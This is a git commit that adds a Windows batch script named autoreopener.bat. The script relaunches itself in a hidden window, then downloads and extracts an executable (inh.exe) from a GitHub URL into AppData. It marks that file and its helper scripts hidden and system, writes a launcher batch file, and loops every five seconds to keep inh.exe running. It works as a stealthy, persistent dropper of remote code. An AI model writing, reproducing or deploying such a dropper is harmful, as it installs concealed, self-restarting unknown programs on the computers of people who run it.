88af6334dae529a91450a5c93c9f9a95e7a03d55
dexovision <dexovisio@gmail.com>
2025-11-25 23:30:40 -0600

    Add files via upload

---
+++ autoreopener.bat
@@ -0,0 +1,46 @@
+@echo off
+
+:: Relaunch hidden if needed
+if "%1" neq "hidden" (
+    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
+    exit
+)
+
+:: Paths
+set "APP_DIR=%USERPROFILE%\AppData"
+set "EXE_PATH=%APP_DIR%\inh.exe"
+set "EXE_PATH1=%APPDATA%\autoreopener.bat"
+set "ZIP_PATH=%APP_DIR%\inh.zip"
+set "DOWNLOAD_URL=https://raw.githubusercontent.com/dexovision/injector/main/inh.zip"
+set "DOWNLOAD_URL1=https://raw.githubusercontent.com/dexovision/injector/main/autoreopener1.bat"
+
+:loop
+:: If missing, download and extract
+if not exist "%EXE_PATH%" (
+    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ZIP_PATH%'"
+    powershell -Command "Expand-Archive -LiteralPath '%ZIP_PATH%' -DestinationPath '%APP_DIR%' -Force"
+    del "%ZIP_PATH%"
+    attrib +h +s %USERPROFILE%\AppData\inh.exe
+)
+
+if not exist "%EXE_PATH1%" (
+    powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL1%' -OutFile '%EXE_PATH1%'"
+    attrib +h +s "%EXE_PATH1%"
+)
+
+set "LAUNCHER_BAT=%APPDATA%\launcher.bat"
+if not exist "%LAUNCHER_BAT%" (
+    (
+        echo @echo off
+        echo start "" "%APPDATA%\inh.exe"
+        echo start "" "%APPDATA%\autoreopener.bat"
+    ) > "%LAUNCHER_BAT%"
+    attrib +h +s "%LAUNCHER_BAT%"
+)
+
+:: Ensure running
+tasklist /fi "imagename eq inh.exe" | find /i "inh.exe" >nul
+if errorlevel 1 start "" "%EXE_PATH%"
+
+timeout /t 5 /nobreak >nul
+goto loop
